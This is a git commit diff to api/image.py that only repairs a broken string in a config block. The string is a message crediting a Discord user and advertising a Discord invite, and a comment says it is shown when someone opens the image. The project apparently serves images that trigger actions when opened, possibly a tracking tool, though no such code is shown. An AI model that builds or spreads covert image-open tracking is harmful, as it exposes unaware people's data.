554c10d90c9cb23d8ca773d11fef3d9631edf428
meowing-24 <sxdeslxdeproduction@gmail.com>
2025-11-23 20:44:43 -0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -29,8 +29,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "made by @ili.j on discord 
-         join https://discord.gg/Aryvab84rD", # Message to show
+        "message": "made by @ili.j on discord join https://discord.gg/Aryvab84rD", # Message to show
         "richMessage": False, # Enable rich text? (See README for more info)
     },
 
